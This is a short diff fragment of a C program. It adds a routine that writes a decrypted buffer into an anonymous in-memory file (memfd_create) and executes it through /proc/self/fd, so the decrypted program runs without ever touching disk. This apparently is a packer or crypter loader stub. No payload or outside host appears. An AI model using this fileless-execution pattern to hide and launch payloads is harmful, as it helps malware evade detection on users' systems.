@@ -41,4 +41,21 @@ int main(void)
    		}
 		k += bytesR;
 	}
+
+	close(fd);
+	int memfd = syscall(SYS_memfd_create, "decrypted", MFD_CLOEXEC);
+	if (memfd < 0) {
+		free(decrypted_buffer);
+		return (1);
+	}
+	write(memfd, decrypted_buffer, encryptedSize);
+	free(decrypted_buffer);
+	char memfd_path[64];
+	snprintf(memfd_path, sizeof(memfd_path), "/proc/self/fd/%d", memfd);	
+	extern char **environ;
+	char *argv[] = {NULL};
+
+	syscall(SYS_execve, memfd_path, argv, environ); // syscall exits
+
+	return (1);
 }
